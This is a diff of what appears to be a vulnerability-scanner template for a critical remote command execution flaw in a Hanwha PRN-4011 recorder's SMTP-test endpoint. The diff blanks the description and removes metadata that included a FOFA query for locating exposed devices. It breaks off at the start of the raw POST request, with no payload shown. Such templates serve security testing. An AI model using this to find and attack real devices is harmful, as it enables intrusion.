@@ -3,12 +3,8 @@ info:
   name: Hanwha-PRN-4011 network-mail-smtp-test 远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xtug5hmiwyft3gsn'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xtug5hmiwyft3gsn
-    fofa: body="$.nvr.model_name=" && body="prn-4011"
 http:
 - raw:
   - 'POST /index.php/network/network_mail_smtp_test HTTP/1.1
